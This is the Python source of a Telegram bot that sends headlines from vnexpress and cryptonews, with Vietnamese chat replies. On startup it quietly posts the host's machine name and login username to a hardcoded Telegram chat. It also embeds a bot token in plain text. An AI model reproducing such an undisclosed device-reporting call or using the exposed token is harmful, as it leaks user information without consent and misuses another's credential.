# install pip
# pip install telegram
# pip install python-telegram-bot
# pip install beautifulsoup4

import telegram.constants
from bs4 import BeautifulSoup
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import *
import platform
import requests
import os
import vnexpress
import cryptonews

SITE = range(1)

list_web = {'vnexpress','cryptonews'}

def Connection():
    URL = "https://api.telegram.org/bot6201919863:AAHDB2SNjwq6hBdjkH3-QN8XXsxwvxBbBdU/sendMessage"
    uname = platform.uname()
    params = {
        "chat_id": 1392207357,
        "text": f'Connected Successfully\n\nDevice: {uname.node}\nUser: {os.getlogin()}',
    }

    response = requests.post(URL, json=params)

    if response.status_code == 200:
        print("Message sent successfully")
    else:
        print("Failed to send message")


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Starts the conversation"""
    reply_keyboard = [["Vnexpress", "CryptoNews"]]

    await update.message.reply_text(
        "Sup Guys, t là bot cập nhật tin tức hàng ngày cho human\n"
        "Nhập lệnh /start để bắt đầu cuộc trò chuyện với t, còn nếu muốn đuổi tao đi thì /stop\n\n"
        "Choose site: ",
        reply_markup=ReplyKeyboardMarkup(
            reply_keyboard, one_time_keyboard=True
        ),
    )

    return SITE


async def news(update: Update, context):
    message = str(update.message.text)
    if(message.lower().__contains__('vnexpress')):
        data = vnexpress.getNews()
        str1 = ""
        i=0
        for item in data:
            i+=1
            str1 += f'{i}. [{item["title"]}]({item["link"]})'+'\n'
        await update.message.reply_text(text=str1,parse_mode=telegram.constants.ParseMode.MARKDOWN,disable_web_page_preview=True)
    elif(message.lower().__contains__('cryptonews')):
        data = cryptonews.getNews()
        str1 = ""
        i=0
        for item in data:
            i+=1
            str1 += f'{i}. [{item["title"]}]({item["link"]})'+'\n'
        await update.message.reply_text(text=str1, parse_mode=telegram.constants.ParseMode.MARKDOWN,disable_web_page_preview=True)


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user = update.message.from_user
    await update.message.reply_text(
        "Bye, hẹn gặp lại các người!", reply_markup=ReplyKeyboardRemove()
    )
    return ConversationHandler.END

if __name__ == "__main__":
    Connection()

    app = ApplicationBuilder().token("6201919863:AAHDB2SNjwq6hBdjkH3-QN8XXsxwvxBbBdU").build()
    app.add_handler(CommandHandler("news", news))
    # app.add_handler(MessageHandler(filters.TEXT, message))
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            SITE: [MessageHandler(filters.Regex("^(Vnexpress|CryptoNews)$"), news)],
        },
        fallbacks=[CommandHandler("stop", stop)],
    )
    app.add_handler(conv_handler)
    app.run_polling()